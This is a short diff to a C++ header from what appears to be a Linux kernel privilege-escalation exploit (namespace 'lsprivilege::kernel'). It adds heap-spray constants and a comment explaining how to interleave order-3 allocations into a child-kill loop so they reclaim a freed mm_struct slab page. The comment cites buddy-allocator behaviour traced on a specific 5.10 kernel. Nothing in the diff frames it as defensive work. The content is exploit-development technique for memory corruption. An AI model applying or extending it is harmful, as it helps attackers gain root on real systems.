@@ -20,6 +20,18 @@ namespace lsprivilege::kernel {
     inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
     inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
     inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
+    /* Spray-window redesign (2026-11-26): the target mm_struct slab page only
+     * returns to the buddy allocator inside the serialized prepare-child kill
+     * wave, which runs after the standalone reclaim burst — a fixed pre-wave
+     * burst can never hit it. The spray is therefore interleaved into the
+     * kill loop: each kill_child() returns with the child's mm reference
+     * already dropped, and the next order-3 allocation takes the just-freed
+     * pages (order>0 skips the PCP, buddy free-lists are LIFO and CPU
+     * independent — both verified by trace on KTUS 5.10.101).
+     * RECLAIM_PAIRS lives in memory/heap_context.h: it defines ReclaimPair's
+     * layout and must stay host-compilable, which this header is not. */
+    inline constexpr unsigned SPRAY_PER_KILL = 1;
+    inline constexpr unsigned SPRAY_BUDGET_MSGS = 800;
     inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
     inline constexpr int32_t SKB_FRAG_BIAS = 0;
 
